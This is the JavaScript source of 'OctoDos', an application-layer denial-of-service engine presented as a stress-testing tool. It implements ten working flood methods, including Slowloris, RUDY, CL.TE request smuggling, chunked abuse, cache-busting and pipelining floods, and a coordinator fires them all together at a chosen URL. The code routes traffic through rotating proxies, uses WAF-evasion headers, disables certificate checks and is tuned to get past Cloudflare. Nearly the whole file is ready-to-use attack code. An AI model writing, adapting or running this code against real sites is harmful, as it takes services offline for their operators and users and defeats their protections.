/**
 * OctoDos L7 Engine v1.0.0 — REAL-IMPACT Layer 7 Assault
 * 10 coordinated tentacle methods for application-layer stress testing.
 *
 * ALL METHODS SEND REAL HTTP REQUESTS. This is NOT a simulation.
 * Use only with explicit written authorization.
 *
 * Created by ZetaGo-Aurum | MIT License
 */
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const chalk = require('chalk');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { generateEvasionHeaders, obfuscatePath, rand } = require('./antiwaf');
const { getNextHttpProxy, getProxyStats } = require('./proxy');

// Disable certificate validation for stress testing
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ── CONNECTION POOLING (Crucial for high RPS without port exhaustion) ──
let httpAgent;
let httpsAgent;

function initAgents(threads) {
    const limit = Math.max(256, threads * 128); // Dynamic cap to prevent RAM OOM
    const agentOpts = {
        keepAlive: true,
        keepAliveMsecs: 1000,
        maxSockets: limit,
        maxFreeSockets: Math.floor(limit / 2),
        scheduling: 'fifo',
        timeout: 5000
    };
    httpAgent = new http.Agent(agentOpts);
    httpsAgent = new https.Agent({ ...agentOpts, rejectUnauthorized: false });
}

const STATS = {
    totalRequests: 0,
    successfulRequests: 0,
    failedRequests: 0,
    statusCodes: {},
    methodsUsed: [],
    bytesTransferred: 0,
    connectionsOpened: 0,
    connectionsFailed: 0,
    startTime: 0,
};

function parseTarget(target) {
    try {
        const u = new URL(target);
        return { protocol: u.protocol, hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname + u.search, isHttps: u.protocol === 'https:', origin: u.origin };
    } catch { return null; }
}

function randomString(len) {
    return crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len);
}
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

// ── Quick UA generator for raw socket methods ──
const RAW_UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
];
function randomUA() { return RAW_UAS[Math.floor(Math.random() * RAW_UAS.length)]; }

// ═══════════════════════════════════════════════════
// METHOD 1: HTTP-FLOOD — Volumetric multi-method flood (BURST MODE)
// ═══════════════════════════════════════════════════
function httpFlood(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const methods = ['GET', 'POST', 'HEAD', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'];
        const mod = t.isHttps ? https : http;
        let done = false;

        function fire() {
            if (done) return;
            if (Date.now() >= end) { done = true; return resolve(); }
            const method = methods[Math.floor(Math.random() * methods.length)];
            const path = t.path + '?' + randomString(8) + '=' + randomString(16);
            const headers = generateEvasionHeaders(target);
            headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
            headers['Pragma'] = 'no-cache';

            const agent = getOptimalAgent(t, !!process.env.PROXY_ENABLED);
            const opts = { agent, hostname: t.hostname, port: t.port, path, method, headers, timeout: 2000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++;
                STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('data', (chunk) => { STATS.bytesTransferred += chunk.length; });
                res.on('end', () => setImmediate(fire));
                res.resume();
            });
            req.on('error', () => { STATS.totalRequests++; STATS.failedRequests++; setImmediate(fire); });
            req.on('timeout', () => { req.destroy(); });
            if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
                req.write(randomString(randomInt(256, 2048)));
            }
            req.end();
            STATS.connectionsOpened++;
        }
        // BURST MODE: 10 concurrent fire chains per thread
        for (let b = 0; b < 10; b++) fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 2: SLOWLORIS — Keep connections alive with partial headers
// ═══════════════════════════════════════════════════
function slowloris(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const net = require('net');
        const tls = require('tls');
        const sockets = [];

        function openConnection() {
            if (Date.now() >= end) return;
            const sock = t.isHttps
                ? tls.connect({ host: t.hostname, port: t.port, rejectUnauthorized: false })
                : net.connect({ host: t.hostname, port: t.port });

            sock.setTimeout(0);
            sock.on('connect', () => {
                STATS.connectionsOpened++;
                sock.write(`GET /${randomString(8)} HTTP/1.1\r\nHost: ${t.hostname}\r\nUser-Agent: ${rand(RAW_UAS)}\r\nAccept: */*\r\nConnection: keep-alive\r\n`);
                sockets.push(sock);
            });
            sock.on('error', () => { STATS.connectionsFailed++; });
            sock.on('close', () => { const i = sockets.indexOf(sock); if (i > -1) sockets.splice(i, 1); });
        }

        // Open many connections
        for (let i = 0; i < 200; i++) openConnection();

        // Drip partial headers to keep alive
        const drip = setInterval(() => {
            if (Date.now() >= end) { clearInterval(drip); return; }
            sockets.forEach(s => {
                try { s.write(`X-${randomString(6)}: ${randomString(12)}\r\n`); STATS.totalRequests++; STATS.successfulRequests++; } catch { }
            });
            // Replenish dead connections
            while (sockets.length < 200 && Date.now() < end) openConnection();
        }, 3000);

        setTimeout(() => {
            clearInterval(drip);
            sockets.forEach(s => { try { s.destroy(); } catch { } });
            resolve();
        }, duration * 1000);
    });
}

// ═══════════════════════════════════════════════════
// METHOD 3: RUDY — R-U-Dead-Yet (slow POST body)
// ═══════════════════════════════════════════════════
function rudy(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const net = require('net');
        const tls = require('tls');
        const sockets = [];

        function openRudy() {
            if (Date.now() >= end) return;
            const sock = t.isHttps
                ? tls.connect({ host: t.hostname, port: t.port, rejectUnauthorized: false })
                : net.connect({ host: t.hostname, port: t.port });

            sock.setTimeout(0);
            sock.on('connect', () => {
                STATS.connectionsOpened++;
                const contentLength = randomInt(100000, 1000000);
                sock.write(`POST /${randomString(8)} HTTP/1.1\r\nHost: ${t.hostname}\r\nUser-Agent: ${rand(RAW_UAS)}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${contentLength}\r\nConnection: keep-alive\r\n\r\n`);
                sockets.push(sock);
            });
            sock.on('error', () => { STATS.connectionsFailed++; });
            sock.on('close', () => { const i = sockets.indexOf(sock); if (i > -1) sockets.splice(i, 1); });
        }

        for (let i = 0; i < 100; i++) openRudy();

        const drip = setInterval(() => {
            if (Date.now() >= end) { clearInterval(drip); return; }
            sockets.forEach(s => {
                try { s.write(randomString(1)); STATS.totalRequests++; STATS.successfulRequests++; STATS.bytesTransferred++; } catch { }
            });
            while (sockets.length < 100 && Date.now() < end) openRudy();
        }, 1000);

        setTimeout(() => {
            clearInterval(drip);
            sockets.forEach(s => { try { s.destroy(); } catch { } });
            resolve();
        }, duration * 1000);
    });
}

// ═══════════════════════════════════════════════════
// METHOD 4: HTTP-DESYNC — CL.TE request smuggling
// ═══════════════════════════════════════════════════
function httpDesync(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const net = require('net');
        const tls = require('tls');

        function fire() {
            if (Date.now() >= end) return resolve();
            const sock = t.isHttps
                ? tls.connect({ host: t.hostname, port: t.port, rejectUnauthorized: false })
                : net.connect({ host: t.hostname, port: t.port });

            sock.setTimeout(5000);
            sock.on('connect', () => {
                STATS.connectionsOpened++;
                // CL.TE desync payload
                const smuggled = `GET /${randomString(8)} HTTP/1.1\r\nHost: ${t.hostname}\r\n\r\n`;
                const payload = `POST / HTTP/1.1\r\nHost: ${t.hostname}\r\nContent-Length: ${smuggled.length + 5}\r\nTransfer-Encoding: chunked\r\nUser-Agent: ${rand(RAW_UAS)}\r\nConnection: keep-alive\r\n\r\n0\r\n\r\n${smuggled}`;
                sock.write(payload);
                STATS.totalRequests++;
                STATS.successfulRequests++;
                STATS.bytesTransferred += payload.length;
                sock.on('data', () => { });
                setTimeout(() => { sock.destroy(); setImmediate(fire); }, 500);
            });
            sock.on('error', () => { STATS.totalRequests++; STATS.failedRequests++; STATS.connectionsFailed++; setImmediate(fire); });
            sock.on('timeout', () => { sock.destroy(); });
        }
        fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 5: CHUNKED — Slow chunked transfer abuse
// ═══════════════════════════════════════════════════
function chunkedAbuse(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const net = require('net');
        const tls = require('tls');
        const sockets = [];

        function openChunked() {
            if (Date.now() >= end) return;
            const sock = t.isHttps
                ? tls.connect({ host: t.hostname, port: t.port, rejectUnauthorized: false })
                : net.connect({ host: t.hostname, port: t.port });

            sock.setTimeout(0);
            sock.on('connect', () => {
                STATS.connectionsOpened++;
                sock.write(`POST /${randomString(8)} HTTP/1.1\r\nHost: ${t.hostname}\r\nUser-Agent: ${rand(RAW_UAS)}\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n`);
                sockets.push(sock);
            });
            sock.on('error', () => { STATS.connectionsFailed++; });
            sock.on('close', () => { const i = sockets.indexOf(sock); if (i > -1) sockets.splice(i, 1); });
        }

        for (let i = 0; i < 100; i++) openChunked();

        const drip = setInterval(() => {
            if (Date.now() >= end) { clearInterval(drip); return; }
            sockets.forEach(s => {
                try {
                    const chunk = randomString(randomInt(1, 16));
                    s.write(`${chunk.length.toString(16)}\r\n${chunk}\r\n`);
                    STATS.totalRequests++; STATS.successfulRequests++;
                    STATS.bytesTransferred += chunk.length;
                } catch { }
            });
            while (sockets.length < 100 && Date.now() < end) openChunked();
        }, 2000);

        setTimeout(() => {
            clearInterval(drip);
            sockets.forEach(s => { try { s.write('0\r\n\r\n'); s.destroy(); } catch { } });
            resolve();
        }, duration * 1000);
    });
}

// ═══════════════════════════════════════════════════
// METHOD 6: BROWSER-EMU — Full browser fingerprint flood (BURST MODE)
// ═══════════════════════════════════════════════════
function browserEmu(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const mod = t.isHttps ? https : http;
        let done = false;

        function fire() {
            if (done) return;
            if (Date.now() >= end) { done = true; return resolve(); }
            const headers = generateEvasionHeaders(target);

            const path = t.path + '?' + randomString(6) + '=' + randomString(12);
            const agent = getOptimalAgent(t, !!process.env.PROXY_ENABLED);
            const opts = { agent, hostname: t.hostname, port: t.port, path, method: 'GET', headers, timeout: 2000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('data', (chunk) => { STATS.bytesTransferred += chunk.length; });
                res.on('end', () => setImmediate(fire));
                res.resume();
            });
            req.on('error', () => { STATS.totalRequests++; STATS.failedRequests++; setImmediate(fire); });
            req.on('timeout', () => { req.destroy(); });
            req.end();
            STATS.connectionsOpened++;
        }
        for (let b = 0; b < 10; b++) fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 7: CACHE-BUST — CDN/cache bypass flood (BURST MODE)
// ═══════════════════════════════════════════════════
function cacheBust(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const mod = t.isHttps ? https : http;
        let done = false;

        function fire() {
            if (done) return;
            if (Date.now() >= end) { done = true; return resolve(); }
            const uuid = `${Date.now()}-${Math.random().toString(36).slice(2)}`;
            const path = t.path + `?_cb=${uuid}&_t=${Date.now()}&_r=${randomString(16)}`;
            const headers = generateEvasionHeaders(target);
            headers['Cache-Control'] = 'no-cache, no-store, must-revalidate, max-age=0';
            headers['Pragma'] = 'no-cache';
            headers['If-None-Match'] = `"${randomString(32)}"`;

            const agent = getOptimalAgent(t, !!process.env.PROXY_ENABLED);
            const opts = { agent, hostname: t.hostname, port: t.port, path, method: 'GET', headers, timeout: 2000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('data', (chunk) => { STATS.bytesTransferred += chunk.length; });
                res.on('end', () => setImmediate(fire));
                res.resume();
            });
            req.on('error', () => { STATS.totalRequests++; STATS.failedRequests++; setImmediate(fire); });
            req.on('timeout', () => { req.destroy(); });
            req.end();
            STATS.connectionsOpened++;
        }
        for (let b = 0; b < 10; b++) fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 8: MULTIPART-FLOOD — Multipart form abuse (BURST MODE)
// ═══════════════════════════════════════════════════
function multipartFlood(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const mod = t.isHttps ? https : http;
        let done = false;

        function fire() {
            if (done) return;
            if (Date.now() >= end) { done = true; return resolve(); }
            const boundary = `----OctoDos${randomString(16)}`;
            let body = '';
            const fieldCount = randomInt(3, 10);
            for (let i = 0; i < fieldCount; i++) {
                body += `--${boundary}\r\nContent-Disposition: form-data; name="${randomString(6)}"\r\n\r\n${randomString(randomInt(32, 128))}\r\n`;
            }
            body += `--${boundary}--\r\n`;

            const headers = generateEvasionHeaders(target);
            headers['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
            headers['Content-Length'] = Buffer.byteLength(body).toString();

            const agent = getOptimalAgent(t, !!process.env.PROXY_ENABLED);
            const opts = { agent, hostname: t.hostname, port: t.port, path: t.path, method: 'POST', headers, timeout: 2000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('data', (chunk) => { STATS.bytesTransferred += chunk.length; });
                res.on('end', () => setImmediate(fire));
                res.resume();
            });
            req.on('error', () => { STATS.totalRequests++; STATS.failedRequests++; setImmediate(fire); });
            req.on('timeout', () => { req.destroy(); });
            req.write(body);
            req.end();
            STATS.connectionsOpened++;
            STATS.bytesTransferred += body.length;
        }
        for (let b = 0; b < 10; b++) fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 9: HEAD-FLOOD — Lightweight high-frequency (BURST MODE)
// ═══════════════════════════════════════════════════
function headFlood(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const mod = t.isHttps ? https : http;
        let done = false;

        function fire() {
            if (done) return;
            if (Date.now() >= end) { done = true; return resolve(); }
            const path = t.path + '?' + randomString(6) + '=' + randomString(8);
            const headers = generateEvasionHeaders(target);
            const agent = getOptimalAgent(t, !!process.env.PROXY_ENABLED);
            const opts = { agent, hostname: t.hostname, port: t.port, path, method: 'HEAD', headers, timeout: 2000, rejectUnauthorized: false };
            const req = mod.request(opts, (res) => {
                STATS.totalRequests++; STATS.successfulRequests++;
                STATS.statusCodes[res.statusCode] = (STATS.statusCodes[res.statusCode] || 0) + 1;
                res.on('end', () => setImmediate(fire));
                res.resume();
            });
            req.on('error', () => { STATS.totalRequests++; STATS.failedRequests++; setImmediate(fire); });
            req.on('timeout', () => { req.destroy(); });
            req.end();
            STATS.connectionsOpened++;
        }
        for (let b = 0; b < 10; b++) fire();
    });
}

// ═══════════════════════════════════════════════════
// METHOD 10: PIPELINE — HTTP pipelining multi-request
// ═══════════════════════════════════════════════════
function pipeline(target, duration) {
    return new Promise((resolve) => {
        const t = parseTarget(target);
        if (!t) return resolve();
        const end = Date.now() + duration * 1000;
        const net = require('net');
        const tls = require('tls');

        function fire() {
            if (Date.now() >= end) return resolve();
            const sock = t.isHttps
                ? tls.connect({ host: t.hostname, port: t.port, rejectUnauthorized: false })
                : net.connect({ host: t.hostname, port: t.port });

            sock.setTimeout(10000);
            sock.on('connect', () => {
                STATS.connectionsOpened++;
                // Send multiple pipelined requests on one connection
                const reqCount = randomInt(5, 20);
                let payload = '';
                for (let i = 0; i < reqCount; i++) {
                    payload += `GET /${randomString(8)}?${randomString(6)}=${randomString(12)} HTTP/1.1\r\nHost: ${t.hostname}\r\nUser-Agent: ${rand(RAW_UAS)}\r\nConnection: keep-alive\r\n\r\n`;
                }
                sock.write(payload);
                STATS.totalRequests += reqCount;
                STATS.successfulRequests += reqCount;
                STATS.bytesTransferred += payload.length;

                sock.on('data', () => { });
                setTimeout(() => { sock.destroy(); setImmediate(fire); }, 2000);
            });
            sock.on('error', () => { STATS.connectionsFailed++; STATS.failedRequests++; setImmediate(fire); });
            sock.on('timeout', () => { sock.destroy(); });
        }
        fire();
    });
}

// ── DYNAMIC TLS SEC-LEVEL BYPASS (For Cloudflare CF-RAY emulation) ──
function getTlsCiphers() {
    return [
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_AES_128_GCM_SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
    ].join(':');
}

// ── SMART AGENT TUNNELS ──
function getOptimalAgent(t, useProxy) {
    if (!useProxy) return t.isHttps ? httpsAgent : httpAgent;

    const proxyUrl = getNextHttpProxy();
    if (!proxyUrl) return t.isHttps ? httpsAgent : httpAgent; // fallback

    // True Proxy Tunneling to prevent Node.js 1 RPS Hang
    const opts = { keepAlive: true, timeout: 5000, rejectUnauthorized: false };
    if (t.isHttps) {
        opts.ciphers = getTlsCiphers();
        opts.secureProtocol = 'TLSv1_2_method';
        return new HttpsProxyAgent({ ...opts, proxy: proxyUrl });
    } else {
        return new HttpProxyAgent({ ...opts, proxy: proxyUrl });
    }
}

// ═══════════════════════════════════════════════════
// TENTACLE COORDINATOR — Distribute threads across methods
// ═══════════════════════════════════════════════════
async function startL7(target, threads, time, useProxy) {
    initAgents(threads);
    // Reset stats
    Object.assign(STATS, { totalRequests: 0, successfulRequests: 0, failedRequests: 0, statusCodes: {}, methodsUsed: [], bytesTransferred: 0, connectionsOpened: 0, connectionsFailed: 0, startTime: Date.now() });

    const methods = [
        { name: 'HTTP-FLOOD',   fn: httpFlood,      weight: 25 },
        { name: 'SLOWLORIS',    fn: slowloris,      weight: 10 },
        { name: 'RUDY',         fn: rudy,           weight: 8 },
        { name: 'HTTP-DESYNC',  fn: httpDesync,     weight: 10 },
        { name: 'CHUNKED',      fn: chunkedAbuse,   weight: 7 },
        { name: 'BROWSER-EMU',  fn: browserEmu,     weight: 10 },
        { name: 'CACHE-BUST',   fn: cacheBust,      weight: 10 },
        { name: 'MULTIPART',    fn: multipartFlood,  weight: 8 },
        { name: 'HEAD-FLOOD',   fn: headFlood,      weight: 7 },
        { name: 'PIPELINE',     fn: pipeline,       weight: 5 },
    ];

    const totalWeight = methods.reduce((a, m) => a + m.weight, 0);
    const tentacles = [];

    console.log(chalk.hex('#FF6B6B').bold(`\n  🐙 Deploying ${methods.length} L7 Tentacles — ${threads} threads, ${time}s\n`));

    for (const method of methods) {
        const methodThreads = Math.max(1, Math.round((method.weight / totalWeight) * threads));
        console.log(chalk.gray(`    ▸ ${method.name.padEnd(14)} — ${methodThreads} threads (${method.weight}% weight)`));
        STATS.methodsUsed.push(method.name);

        for (let i = 0; i < methodThreads; i++) {
            tentacles.push(method.fn(target, time));
        }
    }

    console.log(chalk.hex('#FF6B6B')(`\n  ⚡ Total concurrent tentacles: ${tentacles.length}`));
    console.log(chalk.gray(`  ⏱  Duration: ${time}s — All tentacles attacking simultaneously...\n`));

    // Progress reporter
    const progress = setInterval(() => {
        const elapsed = ((Date.now() - STATS.startTime) / 1000).toFixed(0);
        const rps = STATS.totalRequests / Math.max(1, elapsed);
        const mb = (STATS.bytesTransferred / 1048576).toFixed(2);
        process.stdout.write(chalk.cyan(`\r  📊 ${elapsed}s | Reqs: ${STATS.totalRequests.toLocaleString()} | RPS: ${rps.toFixed(0)} | OK: ${STATS.successfulRequests.toLocaleString()} | Fail: ${STATS.failedRequests.toLocaleString()} | ${mb}MB | Conns: ${STATS.connectionsOpened.toLocaleString()}`));
    }, 1000);

    // Safety timeout: force-complete after duration + 10s to prevent infinite hang
    await Promise.race([
        Promise.all(tentacles),
        new Promise(r => setTimeout(r, (time + 10) * 1000)),
    ]);
    clearInterval(progress);

    const elapsed = ((Date.now() - STATS.startTime) / 1000).toFixed(2);
    const rps = (STATS.totalRequests / Math.max(1, elapsed)).toFixed(0);
    const mb = (STATS.bytesTransferred / 1048576).toFixed(2);

    console.log(chalk.green(`\n\n  ✅ L7 Assault Complete:`));
    console.log(chalk.white(`     Total Requests:  ${STATS.totalRequests.toLocaleString()}`));
    console.log(chalk.white(`     Successful:      ${STATS.successfulRequests.toLocaleString()}`));
    console.log(chalk.white(`     Failed:          ${STATS.failedRequests.toLocaleString()}`));
    console.log(chalk.white(`     Avg RPS:         ${rps}`));
    console.log(chalk.white(`     Data Sent:       ${mb} MB`));
    console.log(chalk.white(`     Connections:     ${STATS.connectionsOpened.toLocaleString()}`));
    console.log(chalk.white(`     Elapsed:         ${elapsed}s`));
    console.log(chalk.white(`     Methods Used:    ${STATS.methodsUsed.join(', ')}`));
    console.log(chalk.white(`     Status Codes:    ${JSON.stringify(STATS.statusCodes)}\n`));

    return { ...STATS, elapsed: parseFloat(elapsed), rps: parseFloat(rps) };
}

module.exports = { startL7 };
